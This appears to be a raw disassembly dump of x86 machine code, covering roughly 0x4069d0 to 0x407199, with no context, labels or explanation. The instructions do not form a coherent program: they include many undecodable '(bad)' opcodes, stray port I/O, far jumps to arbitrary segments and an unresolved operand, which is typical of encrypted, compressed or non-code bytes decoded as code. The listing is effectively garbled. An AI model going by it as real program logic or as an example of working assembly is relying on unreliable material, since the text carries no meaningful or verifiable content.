  4069d0:	in     eax,0x1e
  4069d2:	ror    BYTE PTR [edx],cl
  4069d4:	or     BYTE PTR [edx-0x28],cl
  4069d7:	cmp    al,BYTE PTR [edx+0x1e603597]
  4069dd:	push   edi
  4069de:	enter  0x5e5b,0xbf
  4069e2:	outs   dx,BYTE PTR ds:[esi]
  4069e3:	mov    al,ds:0x70b277a
  4069e8:	push   cs
  4069e9:	jge    0x406994
  4069eb:	je     0x406994
  4069ed:	ja     0x4069d5
  4069ef:	mov    edx,DWORD PTR [ebp+0x2b]
  4069f2:	xor    eax,0x4434b41d
  4069f7:	sub    eax,0x795b3232
  4069fc:	fist   DWORD PTR [edi]
  4069fe:	pop    ds
  4069ff:	pop    edi
  406a00:	xlat   BYTE PTR ds:[ebx]
  406a01:	mov    ds:0xfae114a9,al
  406a06:	pop    edi
  406a07:	mov    ch,0xdc
  406a09:	lahf   
  406a0a:	cwde   
  406a0b:	jg     0x406a47
  406a0d:	lock mov ecx,0x317647a6
  406a13:	sbb    eax,0xa628352d
  406a18:	ins    DWORD PTR es:[edi],dx
  406a19:	pop    esi
  406a1a:	push   cs
  406a1b:	mov    esi,0x566184ac
  406a20:	repnz cmp eax,eax
  406a23:	jecxz  0x4069a7
  406a25:	pop    esi
  406a26:	mov    cl,0x62
  406a28:	push   ecx
  406a29:	lods   eax,DWORD PTR ds:[esi]
  406a2a:	mov    bl,0x95
  406a2c:	sar    DWORD PTR [edx+0x7e],cl
  406a2f:	cmp    al,0x63
  406a31:	pop    ebp
  406a32:	mov    bh,0xa8
  406a34:	(bad)  
  406a35:	es dec ebx
  406a37:	mov    cl,0xc5
  406a39:	lods   eax,DWORD PTR ds:[esi]
  406a3a:	xchg   ecx,eax
  406a3b:	jecxz  0x406a85
  406a3d:	(bad)  
  406a3e:	cmp    al,BYTE PTR [edi]
  406a40:	cdq    
  406a41:	mov    DWORD PTR [ebx+0x746d6659],0x249ca2d1
  406a4b:	in     al,0xaa
  406a4d:	ret    0x7298
  406a50:	out    0x95,al
  406a52:	mov    eax,0xa88178a0
  406a57:	test   cl,bl
  406a59:	xor    al,0x35
  406a5b:	into   
  406a5c:	loope  0x406a74
  406a5e:	xchg   ebx,eax
  406a5f:	push   cs
  406a60:	lods   eax,DWORD PTR ds:[esi]
  406a61:	pop    ecx
  406a62:	jmp    0x6a62123c
  406a67:	mov    al,0x3
  406a69:	dec    esp
  406a6a:	out    0x9b,al
  406a6c:	shl    DWORD PTR [eax],1
  406a6e:	idiv   BYTE PTR [edx]
  406a70:	jnp    0x406a75
  406a72:	mov    esi,0xc0cf580d
  406a77:	dec    ebx
  406a78:	pop    ecx
  406a79:	shr    BYTE PTR [esp+ebp*8-0x7385ca53],1
  406a80:	xlat   BYTE PTR gs:[ebx]
  406a82:	fwait
  406a83:	pop    ebp
  406a84:	out    dx,al
  406a85:	pop    ebp
  406a86:	test   DWORD PTR [edx-0x45],ecx
  406a89:	loopne 0x406ae1
  406a8b:	repz push esp
  406a8d:	or     eax,0xc2ca727a
  406a92:	xor    eax,0xde784cb3
  406a97:	in     eax,dx
  406a98:	lea    edx,[ecx+0x21]
  406a9b:	ins    DWORD PTR es:[edi],dx
  406a9c:	xor    bl,BYTE PTR [edx-0x7f9e07c8]
  406aa2:	mov    eax,0xb09ea36a
  406aa7:	jmp    0x406aa1
  406aa9:	jg     0x406ad0
  406aab:	xchg   ebx,eax
  406aac:	and    ecx,ecx
  406aae:	xor    eax,0x732a303f
  406ab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ab4:	sar    bh,cl
  406ab6:	dec    edx
  406ab7:	jle    0x406acf
  406ab9:	jmp    0xfc0f:0x6e8290b1
  406ac0:	shr    BYTE PTR [eax+eax*4],cl
  406ac3:	xor    ah,BYTE PTR [ebp+ebp*2-0x7a]
  406ac7:	rol    DWORD PTR [ebx],1
  406ac9:	bound  edi,QWORD PTR [edx]
  406acb:	loope  0x406aae
  406acd:	cmp    ah,cl
  406acf:	xor    DWORD PTR [edi],esi
  406ad1:	sbb    BYTE PTR [edx-0x46fc694c],dl
  406ad7:	addr16 pop ss
  406ad9:	push   ebx
  406ada:	test   BYTE PTR [eax],ah
  406adc:	mov    eax,ds:0x892ebe52
  406ae1:	add    al,ch
  406ae3:	(bad)  
  406ae4:	mov    ecx,0xafe637bf
  406ae9:	mov    ebp,0xbc2584b5
  406aee:	mov    bl,0xa0
  406af0:	outs   dx,DWORD PTR ds:[esi]
  406af1:	ror    BYTE PTR [ebx-0x2c4469f5],1
  406af7:	cdq    
  406af8:	mov    ah,0x2
  406afa:	iret   
  406afb:	mov    al,BYTE PTR [bx-0x23]
  406aff:	xor    ebx,esi
  406b01:	inc    ebx
  406b02:	test   eax,0xc97ff31
  406b07:	and    BYTE PTR [edi+0x22f18d5f],bh
  406b0d:	inc    edx
  406b0e:	cmp    al,0xf9
  406b10:	(bad)  
  406b11:	into   
  406b12:	in     al,dx
  406b13:	pop    ebx
  406b14:	std    
  406b15:	inc    ecx
  406b16:	repz stc 
  406b18:	or     ecx,DWORD PTR [ebx]
  406b1a:	fild   WORD PTR [ecx+ebx*8+0x257b5a38]
  406b21:	mov    WORD PTR [ebx-0xf2e6d99],fs
  406b27:	mov    eax,0x8915d336
  406b2c:	test   al,0xab
  406b2e:	(bad)  
  406b2f:	jno    0x406b50
  406b31:	cmp    DWORD PTR [edi],ecx
  406b33:	popf   
  406b34:	test   eax,0xb14ecd76
  406b39:	xor    eax,0xf0292b8f
  406b3e:	ret    
  406b3f:	inc    ebp
  406b40:	mov    dh,0x28
  406b42:	ret    0xa819
  406b45:	es std 
  406b47:	jnp    0x406bb2
  406b49:	xor    esp,DWORD PTR [esi*4+0x7d47e594]
  406b50:	pop    ss
  406b51:	jmp    0x406b4f
  406b53:	and    al,0x87
  406b55:	aad    0x52
  406b57:	es jbe 0x406b4a
  406b5a:	cli    
  406b5b:	lock hlt 
  406b5d:	sub    BYTE PTR [ebx+0x1f05d10b],al
  406b63:	xor    eax,0x4d4d1329
  406b68:	mul    DWORD PTR [esi-0x58]
  406b6b:	and    esi,DWORD PTR [edi]
  406b6d:	mov    bh,0x3a
  406b6f:	in     eax,0xff
  406b71:	test   BYTE PTR [esi],ch
  406b73:	fmul   DWORD PTR [ebx+0x2936a4cf]
  406b79:	sub    DWORD PTR [ecx-0x5ae45dcd],esi
  406b7f:	adc    DWORD PTR [ecx-0xbc9e8c6],ebx
  406b85:	adc    edi,eax
  406b87:	loope  0x406bb9
  406b89:	jecxz  0x406b1b
  406b8b:	cmp    dl,0x7a
  406b8e:	pusha  
  406b8f:	hlt    
  406b90:	or     eax,0xc5af2efc
  406b95:	push   0x68
  406b97:	cmp    edx,edx
  406b99:	pop    eax
  406b9a:	shl    BYTE PTR [ecx+esi*2+0x36],0xf2
  406b9f:	cmp    DWORD PTR [ecx+0x77a947],ebp
  406ba5:	shr    BYTE PTR [esi+0x69],1
  406ba8:	imul   eax,DWORD PTR [esi+0x170e680e],0xfffffff3
  406baf:	fsub   DWORD PTR [eax-0x1cc29fb9]
  406bb5:	xchg   edi,eax
  406bb6:	lahf   
  406bb7:	adc    DWORD PTR [eax],ecx
  406bb9:	fisub  DWORD PTR [edi+ecx*2-0x37]
  406bbd:	out    0x7e,eax
  406bbf:	stc    
  406bc0:	xchg   edx,eax
  406bc1:	xchg   ebp,eax
  406bc2:	int3   
  406bc3:	sbb    BYTE PTR [ecx],ah
  406bc5:	call   0xc166:0x2638631e
  406bcc:	sub    edx,DWORD PTR [eax-0x48]
  406bcf:	dec    edx
  406bd0:	imul   ecx,DWORD PTR [esi+0x62],0x6bf58b9a
  406bd7:	or     eax,0x2421fc57
  406bdc:	test   al,0x6d
  406bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bdf:	retf   
  406be0:	inc    esp
  406be1:	ror    DWORD PTR [esi],1
  406be3:	cmp    BYTE PTR [esi+ecx*4],bh
  406be6:	xchg   ebx,eax
  406be7:	sbb    BYTE PTR [esi+0x5c],cl
  406bea:	push   esp
  406beb:	(bad)  
  406bec:	jmp    0xc591:0xa7005a3c
  406bf3:	fisubr WORD PTR [esi-0x3ba8432a]
  406bf9:	dec    edi
  406bfa:	clc    
  406bfb:	enter  0x32e1,0xfc
  406bff:	or     esp,DWORD PTR [esi+0x6]
  406c02:	int    0x56
  406c04:	add    dh,dl
  406c06:	loop   0x406c0a
  406c08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c09:	jb     0x406c68
  406c0b:	or     ah,dl
  406c0d:	out    dx,eax
  406c0e:	test   eax,0xa972be78
  406c13:	fistp  DWORD PTR [bx-0x25ee]
  406c18:	mov    dl,0x4f
  406c1a:	dec    edx
  406c1b:	dec    edx
  406c1c:	mov    al,cs:0xf0f51efa
  406c22:	jle    0x406c81
  406c24:	mov    eax,0x72043156
  406c29:	mov    bl,0xcd
  406c2b:	in     al,0xed
  406c2d:	xor    ebp,DWORD PTR [edi-0x67881448]
  406c33:	lock add eax,edx
  406c36:	icebp  
  406c37:	pop    esi
  406c38:	je     0x406c9f
  406c3a:	push   edx
  406c3b:	inc    edx
  406c3c:	xlat   BYTE PTR ds:[ebx]
  406c3d:	jle    0x406bfa
  406c3f:	mov    dl,0xec
  406c41:	loopne 0x406c29
  406c43:	pushf  
  406c44:	add    eax,DWORD PTR [ebp+0x7e]
  406c47:	daa    
  406c48:	(bad)  
  406c49:	ret    
  406c4a:	mov    esp,0xc3eeafc4
  406c4f:	push   es
  406c50:	call   0xc182d36c
  406c55:	shr    BYTE PTR [ecx],cl
  406c57:	cs idiv dl
  406c5a:	push   edi
  406c5b:	clc    
  406c5c:	sub    al,0x3b
  406c5e:	adc    bl,BYTE PTR [esp+edi*2-0x9]
  406c62:	sbb    eax,0xed5c1d65
  406c67:	ss fs mov ecx,0xbae8c496
  406c6e:	adc    DWORD PTR [edx],0x82c37798
  406c74:	push   ebp
  406c75:	ja     0x406cc5
  406c77:	add    edx,DWORD PTR [ebp-0x48b13748]
  406c7d:	in     eax,dx
  406c7e:	cdq    
  406c7f:	and    eax,0xbb52d0bb
  406c84:	cmp    BYTE PTR [esi],bh
  406c86:	push   esp
  406c87:	(bad)  
  406c88:	xlat   BYTE PTR ds:[ebx]
  406c89:	out    0xf1,eax
  406c8b:	mov    al,0x30
  406c8d:	mov    dh,BYTE PTR [ebp+0x8]
  406c90:	adc    eax,DWORD PTR [ecx+0x2f56bbe5]
  406c96:	mov    cl,0xd1
  406c98:	push   ss
  406c99:	mov    bh,0x65
  406c9b:	mov    ecx,0xbbef4f50
  406ca0:	imul   eax,DWORD PTR [edx+0x44],0x1e
  406ca4:	lahf   
  406ca5:	cli    
  406ca6:	test   eax,0x4acab864
  406cab:	nop
  406cac:	xchg   DWORD PTR [edx],esi
  406cae:	repz rcr BYTE PTR [edx-0xf048b59],0x4
  406cb6:	pop    edi
  406cb7:	mov    esi,0x459974b6
  406cbc:	sar    edx,0x22
  406cbf:	call   0xb50d:0xc1267db
  406cc6:	stos   BYTE PTR es:[edi],al
  406cc7:	fdivr  st,st(0)
  406cc9:	mov    ds:0xb1012a80,al
  406cce:	sbb    eax,0x5a2f9492
  406cd3:	enter  0x2219,0x53
  406cd7:	inc    esp
  406cd8:	je     0x406c78
  406cda:	retf   0x3143
  406cdd:	stc    
  406cde:	les    edi,FWORD PTR [ebx+0x61]
  406ce1:	loope  0x406d55
  406ce3:	pop    esp
  406ce4:	(bad)  
  406ce6:	sub    eax,0x3ce7b73b
  406ceb:	and    al,0xb8
  406ced:	fwait
  406cee:	shl    al,0x76
  406cf1:	jge    0x406cb8
  406cf3:	or     al,0x99
  406cf5:	inc    ebx
  406cf6:	lods   eax,DWORD PTR ds:[esi]
  406cf7:	(bad)  
  406cf8:	cli    
  406cf9:	cmc    
  406cfa:	ret    0x61ad
  406cfd:	xlat   BYTE PTR ds:[ebx]
  406cfe:	jns    0x406cf7
  406d00:	mov    esi,0xa4d8d850
  406d05:	jno    0x406d79
  406d07:	stc    
  406d08:	xor    DWORD PTR [ecx+0x59e98951],esp
  406d0e:	or     edx,DWORD PTR [eax+edi*8+0x57]
  406d12:	sub    dh,al
  406d14:	aad    0x5d
  406d16:	imul   eax,ebp,0x26e165c1
  406d1c:	push   edx
  406d1d:	pop    es
  406d1e:	xor    eax,0x432336f2
  406d23:	imul   ebp,DWORD PTR [edi+0x1c],0xffffffb3
  406d27:	nop
  406d28:	inc    ebp
  406d29:	mov    al,0xf0
  406d2b:	inc    ebp
  406d2c:	sub    eax,0x33e34f42
  406d31:	in     al,0xc0
  406d33:	les    edi,FWORD PTR [ebx]
  406d35:	cmp    eax,0xc1b67b99
  406d3a:	in     eax,0x99
  406d3c:	mov    ah,0x60
  406d3e:	in     al,dx
  406d3f:	stc    
  406d40:	mov    cl,0xbc
  406d42:	and    esi,DWORD PTR [edi]
  406d44:	and    esi,0xffffffef
  406d47:	inc    esp
  406d48:	div    DWORD PTR [edx-0x6a]
  406d4b:	fnstsw WORD PTR [esi-0x1e0832c6]
  406d51:	or     eax,DWORD PTR [esi+0x3a]
  406d54:	ins    DWORD PTR es:[edi],dx
  406d55:	or     BYTE PTR [eax+0xb23e636],dh
  406d5b:	mov    ebp,eax
  406d5d:	aad    0x2c
  406d5f:	push   0xffffffa7
  406d61:	ja     0x406d48
  406d63:	xor    esp,DWORD PTR [ebx]
  406d65:	test   BYTE PTR [edx],dh
  406d67:	and    al,ch
  406d69:	and    bl,ch
  406d6b:	jmp    0x406d67
  406d6d:	pop    es
  406d6e:	scas   al,BYTE PTR es:[edi]
  406d6f:	jecxz  0x406d3c
  406d71:	test   al,0xd4
  406d73:	mov    edi,0xf106fc8b
  406d78:	cmp    edx,DWORD PTR [edi+0x6b]
  406d7b:	or     al,0x7f
  406d7d:	push   ebx
  406d7e:	jecxz  0x406dab
  406d80:	push   ecx
  406d81:	add    esp,ecx
  406d83:	inc    eax
  406d84:	push   DWORD PTR [esi]
  406d86:	imul   ecx,DWORD PTR [edx],0x7dd41cd8
  406d8c:	ins    DWORD PTR es:[edi],dx
  406d8d:	aad    0xe3
  406d8f:	pop    ecx
  406d90:	push   ebp
  406d91:	xchg   esp,eax
  406d92:	sbb    DWORD PTR [esp+edi*1-0x41117959],esi
  406d99:	pop    es
  406d9a:	ret    
  406d9b:	fistp  WORD PTR [ecx+edi*4+0x4c2854e4]
  406da2:	push   0xffffffba
  406da4:	sbb    eax,0xc2dfbac7
  406da9:	sub    al,0x6f
  406dab:	mov    esi,0xd50e322c
  406db0:	adc    ecx,ecx
  406db2:	fdiv   st(4),st
  406db4:	cmp    al,0x56
  406db6:	shr    BYTE PTR [ecx+0x1c],0xb3
  406dba:	xor    bl,BYTE PTR [ebp-0x7916bc9c]
  406dc0:	stos   BYTE PTR es:[edi],al
  406dc1:	(bad)  
  406dc2:	in     eax,dx
  406dc3:	or     BYTE PTR [eax],0xc3
  406dc6:	mov    ecx,0xe0415281
  406dcb:	sub    ecx,DWORD PTR [ebp+edx*2-0x5]
  406dcf:	dec    ebx
  406dd0:	fild   QWORD PTR [edx]
  406dd2:	xchg   edi,eax
  406dd3:	fmulp  st(0),st
  406dd5:	adc    dh,BYTE PTR [edi+0x194bb42a]
  406ddb:	test   al,0x9c
  406ddd:	push   ss
  406dde:	mov    eax,ds:0x5ac21313
  406de3:	fidivr WORD PTR [esi+0x66]
  406de6:	push   ebp
  406de7:	mov    al,ds:0xe5c268c9
  406dec:	rcr    BYTE PTR [ebp-0x5b],1
  406def:	inc    ecx
  406df0:	test   BYTE PTR [ebp+0x32],dh
  406df3:	jp     0x406e0f
  406df5:	xchg   ebx,eax
  406df6:	sbb    al,0x85
  406df8:	push   edx
  406df9:	or     eax,0x53a62fe7
  406dfe:	bnd jl 0x406da1
  406e01:	add    DWORD PTR [ebp+0x6c],ecx
  406e04:	mov    eax,0x8b2a752d
  406e09:	or     ebp,edx
  406e0b:	add    al,0xa8
  406e0d:	xchg   ebx,eax
  406e0e:	sub    eax,0xf846069b
  406e13:	pop    ecx
  406e14:	rcr    BYTE PTR ds:0xa1a521b5,1
  406e1a:	(bad)  
  406e1b:	scas   eax,DWORD PTR es:[edi]
  406e1c:	(bad)  
  406e1e:	mov    eax,ds:0x5af19f24
  406e23:	sub    al,0x36
  406e25:	xor    al,0x7c
  406e27:	imul   edx,edi,0x64abec85
  406e2d:	(bad)  
  406e2e:	push   esi
  406e2f:	stos   DWORD PTR es:[edi],eax
  406e30:	ficom  DWORD PTR [ebp+esi*4+0x1d2b05aa]
  406e37:	sbb    BYTE PTR [eax+0x32],dh
  406e3a:	mov    edx,0xc9fc8288
  406e3f:	stos   DWORD PTR es:[edi],eax
  406e40:	jg     0x406e09
  406e42:	scas   eax,DWORD PTR es:[edi]
  406e43:	and    cl,BYTE PTR [eax+0x1cee102]
  406e49:	fcomp  st(0)
  406e4b:	fdivr  st,st(6)
  406e4d:	sbb    al,0x88
  406e4f:	in     al,0xfa
  406e51:	adc    al,0x8f
  406e53:	mov    ebp,esi
  406e55:	mov    al,ds:0xfd90228d
  406e5a:	dec    edi
  406e5b:	fs sub eax,0xfd346390
  406e61:	and    BYTE PTR [eax],cl
  406e63:	aad    0xf9
  406e65:	sbb    ebx,edi
  406e67:	adc    DWORD PTR [esi],esp
  406e69:	inc    ebp
  406e6a:	and    eax,0x7dff5241
  406e6f:	xchg   edx,eax
  406e70:	jmp    0x1585:0xff3c28af
  406e77:	adc    eax,0xf1753c51
  406e7d:	inc    eax
  406e7e:	pop    edx
  406e7f:	sbb    al,0xe5
  406e81:	cmp    al,cl
  406e83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e84:	cmp    eax,0xa726f426
  406e89:	push   eax
  406e8a:	stos   BYTE PTR es:[edi],al
  406e8b:	inc    edx
  406e8c:	lods   al,BYTE PTR ds:[esi]
  406e8d:	outs   dx,BYTE PTR ds:[esi]
  406e8e:	and    al,0xe2
  406e90:	dec    edi
  406e91:	mov    ds:0x19b40f2d,eax
  406e96:	daa    
  406e97:	add    ebx,eax
  406e99:	pusha  
  406e9a:	fwait
  406e9b:	xor    al,0x4f
  406e9d:	(bad)  
  406e9e:	rol    BYTE PTR ds:0x2977f606,1
  406ea4:	add    esi,edx
  406ea6:	lock jae 0x406eb5
  406ea9:	cmc    
  406eaa:	ins    BYTE PTR es:[edi],dx
  406eab:	fbstp  TBYTE PTR [edx]
  406ead:	xchg   ecx,eax
  406eae:	pop    esi
  406eaf:	out    0x88,al
  406eb1:	xchg   ecx,eax
  406eb2:	or     DWORD PTR [ecx-0x74],ebx
  406eb5:	lds    esp,FWORD PTR [eax]
  406eb7:	std    
  406eb8:	push   es
  406eb9:	stos   BYTE PTR es:[edi],al
  406eba:	lahf   
  406ebb:	adc    ebp,DWORD PTR es:[ebp-0x7f]
  406ebf:	dec    edx
  406ec0:	add    eax,0x482588cb
  406ec5:	dec    ebp
  406ec6:	(bad)  
  406ec7:	cmp    eax,0xa24e38ba
  406ecc:	(bad)  
  406ecd:	mov    al,0xfc
  406ecf:	and    eax,0xac6beaf5
  406ed4:	es mov bl,0x73
  406ed7:	repnz cmp al,0xbe
  406eda:	rol    ebx,cl
  406edc:	sub    bh,bh
  406ede:	inc    edi
  406edf:	push   esp
  406ee0:	mov    edx,0xc2e65d33
  406ee5:	mov    dh,0x3
  406ee7:	test   DWORD PTR [eax-0x40],esi
  406eea:	sub    BYTE PTR [eax],0x18
  406eed:	and    DWORD PTR [ebx],esp
  406eef:	mov    ecx,0x836e240c
  406ef4:	or     DWORD PTR [edx],edx
  406ef6:	mov    DWORD PTR [edx],edi
  406ef8:	ja     0x406f5d
  406efa:	lods   al,BYTE PTR ds:[esi]
  406efb:	sub    ebp,esi
  406efd:	loop   0x406ef9
  406eff:	jge    0x406f5f
  406f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f02:	mov    fs,ebx
  406f04:	sbb    BYTE PTR [eax-0x3d4ba4f],dh
  406f0a:	inc    edi
  406f0b:	arpl   WORD PTR [edx+0x3d547562],cx
  406f11:	xor    ebx,DWORD PTR [ebx+ebp*4-0x408d6846]
  406f18:	add    eax,0x79fc0aad
  406f1d:	(bad)  
  406f1e:	add    edx,DWORD PTR [eax+0x36]
  406f21:	jmp    0x3cc2ae31
  406f26:	xor    DWORD PTR [ebp+0x7f58dbbc],edx
  406f2c:	mov    ds,ecx
  406f2e:	and    eax,eax
  406f30:	jne    0x406ee3
  406f32:	les    ebx,FWORD PTR [esi+0x1e5ffb33]
  406f38:	aas    
  406f39:	push   ecx
  406f3a:	(bad)  
  406f3b:	cmp    ebx,esi
  406f3d:	into   
  406f3e:	or     ebp,DWORD PTR [edx+0x33]
  406f41:	pushf  
  406f42:	mov    ss,WORD PTR [ebp+ebp*1-0x63438c0a]
  406f49:	jb     0x406f85
  406f4b:	pop    ebx
  406f4c:	rcr    DWORD PTR [edx],1
  406f4e:	out    0xb,eax
  406f50:	ins    BYTE PTR es:[edi],dx
  406f51:	mov    ah,0x48
  406f53:	pushf  
  406f54:	push   esp
  406f55:	inc    esp
  406f56:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f58:	lds    ebp,FWORD PTR [edx]
  406f5a:	shr    DWORD PTR [ecx-0x4],0xbe
  406f5e:	dec    edx
  406f5f:	dec    eax
  406f60:	pop    ebp
  406f61:	(bad)  
  406f62:	cwde   
  406f63:	std    
  406f64:	adc    eax,0xebfa1722
  406f69:	lahf   
  406f6a:	add    al,BYTE PTR [edi-0x53a32def]
  406f70:	xor    ch,ah
  406f72:	inc    ecx
  406f73:	push   esp
  406f74:	aad    0x41
  406f76:	cmpps  xmm7,xmm4,0xed
  406f7a:	adc    eax,0xc459b9b5
  406f7f:	call   FWORD PTR [edx+0x7b]
  406f82:	mov    bl,0xdd
  406f84:	dec    ecx
  406f85:	dec    edi
  406f86:	out    0xc9,eax
  406f88:	popf   
  406f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f8a:	gs loope 0x406f55
  406f8d:	ins    DWORD PTR es:[edi],dx
  406f8e:	mov    dh,0x4f
  406f90:	push   0x6364042d
  406f95:	inc    edx
  406f96:	ss xor eax,0x161e3975
  406f9c:	js     0x406f8a
  406f9e:	mov    ds:0x93589154,al
  406fa3:	ret    
  406fa4:	fwait
  406fa5:	data16 aas 
  406fa7:	or     eax,edi
  406fa9:	mov    eax,?
  406fab:	push   ecx
  406fac:	jl     0x406f83
  406fae:	cdq    
  406faf:	or     esi,esp
  406fb1:	fmul   QWORD PTR [ebx-0x431c6799]
  406fb7:	lds    edi,FWORD PTR [eax-0x3]
  406fba:	sbb    al,0x67
  406fbc:	rol    BYTE PTR [edx+0x46],cl
  406fbf:	cld    
  406fc0:	pop    ds
  406fc1:	dec    ecx
  406fc2:	mov    bl,0x7e
  406fc4:	or     bl,BYTE PTR [edx+0x1007471c]
  406fca:	push   cs
  406fcb:	jnp    0x406fe4
  406fcd:	int    0xfb
  406fcf:	(bad)  
  406fd0:	call   0x76f7:0x43c40948
  406fd7:	lods   al,BYTE PTR ds:[esi]
  406fd8:	rol    ebx,1
  406fda:	out    0xbd,eax
  406fdc:	ret    
  406fdd:	pop    ebx
  406fde:	xchg   edi,eax
  406fdf:	mov    ebp,0x3493eb46
  406fe4:	fadd   DWORD PTR ds:0xd3dd19fe
  406fea:	pop    esi
  406feb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fec:	sub    ecx,DWORD PTR [edx+edi*1+0x11]
  406ff0:	lea    edi,[esp+ebp*2+0x12e6a41c]
  406ff7:	cmp    BYTE PTR [esi-0x49],bl
  406ffa:	push   esp
  406ffc:	fisub  DWORD PTR [ebx]
  406ffe:	imul   esp,eax,0xa
  407001:	fstp   st(3)
  407003:	out    0x3a,eax
  407005:	int3   
  407006:	dec    esi
  407007:	test   al,0xd4
  407009:	es (bad) 
  40700b:	cmp    BYTE PTR [edi],al
  40700d:	(bad)  
  40700e:	sbb    esp,DWORD PTR [ebx+0x52b7aaac]
  407014:	pop    esi
  407015:	call   0x7ae0f347
  40701a:	pushf  
  40701b:	scas   eax,DWORD PTR es:[edi]
  40701c:	mov    edi,0xccefefe3
  407021:	and    bl,dl
  407023:	lds    ebp,FWORD PTR [esi-0x5a]
  407026:	push   edx
  407027:	jb     0x406fbc
  407029:	cmp    eax,0x13be5c45
  40702e:	or     bl,BYTE PTR ds:0x6351b1f7
  407034:	nop
  407035:	push   cs
  407036:	push   es
  407037:	or     al,0x5a
  407039:	inc    esp
  40703a:	push   ebp
  40703b:	inc    edi
  40703c:	sbb    cl,BYTE PTR [edx]
  40703e:	mul    WORD PTR [ecx+0x60]
  407042:	jbe    0x407054
  407044:	dec    ebx
  407045:	into   
  407046:	ds in  eax,dx
  407048:	cmp    al,0x57
  40704a:	adc    ebx,DWORD PTR [ebx+0x2d]
  40704d:	les    eax,FWORD PTR [edi-0x417607be]
  407053:	js     0x407029
  407055:	cwde   
  407056:	jl     0x407093
  407058:	xor    eax,0x50e64929
  40705d:	sbb    BYTE PTR [edi-0x569f4169],bl
  407063:	sbb    dl,BYTE PTR [ecx]
  407065:	test   al,0xc2
  407067:	jmp    0x407040
  407069:	and    si,WORD PTR [edx+0x6b]
  40706d:	and    cl,BYTE PTR [edi-0x79140701]
  407073:	mov    ss,ebp
  407075:	daa    
  407076:	sbb    edi,ecx
  407078:	retf   
  407079:	sti    
  40707a:	(bad)  
  40707b:	fidiv  DWORD PTR [ecx+0x4d119d76]
  407081:	inc    ecx
  407082:	inc    esp
  407083:	mov    dh,al
  407085:	(bad)  
  407086:	or     edi,edi
  407088:	pop    ss
  407089:	sub    dl,BYTE PTR [edi+0x1aa7e7f8]
  40708f:	pop    esi
  407090:	arpl   sp,sp
  407092:	mov    bl,0x34
  407094:	jae    0x4070ed
  407096:	sti    
  407097:	addr16 (bad) 
  407099:	ss scas al,BYTE PTR es:[edi]
  40709b:	(bad)  
  40709c:	cmp    al,BYTE PTR [esi-0x2a979263]
  4070a2:	jl     0x40703a
  4070a4:	ret    
  4070a5:	addr16 pop ds
  4070a7:	cdq    
  4070a8:	xor    ebp,DWORD PTR [edx-0x4170348b]
  4070ae:	aad    0x5b
  4070b0:	xor    eax,0xd773de53
  4070b5:	bound  edx,QWORD PTR [edi-0x62]
  4070b8:	in     eax,0xf5
  4070ba:	add    DWORD PTR [ebp+eiz*1+0x6cf12478],ebx
  4070c1:	leave  
  4070c2:	mov    ds:0x6204ccfc,eax
  4070c7:	xor    ecx,ecx
  4070c9:	aam    0xe6
  4070cb:	popa   
  4070cc:	push   ds
  4070cd:	repnz loopne 0x40706e
  4070d0:	and    BYTE PTR [ecx+ecx*1],bh
  4070d3:	xor    ecx,DWORD PTR [esi-0x2c]
  4070d6:	jp     0x4070f6
  4070d8:	mov    ebx,0x865b0f65
  4070dd:	mov    dl,0xbe
  4070df:	jno    0x4070b6
  4070e1:	cld    
  4070e2:	jmp    0x40711e
  4070e4:	jl     0x4070f7
  4070e6:	pop    ss
  4070e7:	jecxz  0x40709b
  4070e9:	jb     0x4070ae
  4070eb:	out    dx,al
  4070ec:	adc    eax,0x116d8dae
  4070f1:	cmp    eax,DWORD PTR [edx]
  4070f3:	inc    ecx
  4070f4:	(bad)  
  4070f5:	adc    al,0xb9
  4070f7:	add    ah,bl
  4070f9:	(bad)  
  4070fb:	daa    
  4070fc:	dec    edi
  4070fd:	inc    eax
  4070fe:	loope  0x40716f
  407100:	inc    esp
  407101:	pop    ebp
  407102:	pop    DWORD PTR [ebp-0x48d6f08f]
  407108:	sti    
  407109:	imul   ebx,DWORD PTR [ebx+ecx*8-0x2f45f9b0],0xff74a1b1
  407114:	mov    ds:0x572d7b41,eax
  407119:	jns    0x407171
  40711b:	int3   
  40711c:	lea    esp,[edi-0x5e69f61a]
  407122:	and    al,0x19
  407124:	cmp    DWORD PTR [eax],eax
  407126:	sub    ebp,edi
  407128:	(bad)
  40712b:	xor    esi,ebp
  40712d:	inc    esi
  40712e:	outs   dx,BYTE PTR ds:[esi]
  40712f:	enter  0xeb4b,0xdb
  407133:	add    eax,0x87a90bcc
  407138:	xor    esp,DWORD PTR [edi]
  40713a:	xchg   ecx,eax
  40713b:	cs cmp eax,0x50a2c7c3
  407141:	jne    0x4070da
  407143:	push   edx
  407144:	mov    BYTE PTR [esp+eax*1+0x657aca40],bl
  40714b:	loope  0x40712d
  40714d:	clc    
  40714e:	xchg   ebx,ecx
  407150:	add    BYTE PTR [ecx],dh
  407152:	add    al,cl
  407154:	mov    ebp,0x6ed8132a
  407159:	sbb    esp,DWORD PTR [edx+0x7a]
  40715c:	lock push ss
  40715e:	lahf   
  40715f:	int    0xdc
  407161:	mov    edx,0x1fc45914
  407166:	mov    eax,ds:0xfd36a974
  40716b:	push   es
  40716c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40716d:	push   ss
  40716e:	xchg   esi,eax
  40716f:	dec    ecx
  407170:	add    DWORD PTR [edi+0x2e1aa499],ebx
  407176:	xchg   ebp,eax
  407177:	daa    
  407178:	xchg   edi,eax
  407179:	jae    0x4071eb
  40717b:	js     0x4071a9
  40717d:	push   ebx
  40717e:	or     ebp,DWORD PTR [ebx]
  407180:	jl     0x4071cb
  407182:	aaa    
  407183:	dec    ecx
  407184:	aas    
  407185:	inc    eax
  407186:	push   eax
  407187:	je     0x40717f
  407189:	loopne 0x40712c
  40718b:	fmul   QWORD PTR [ebp+0xf41c57e]
  407191:	cmp    al,BYTE PTR [ecx]
  407193:	xchg   ecx,eax
  407194:	mov    ds:0xded45a8e,al
  407199:	stos   BYTE PTR es:[edi],al
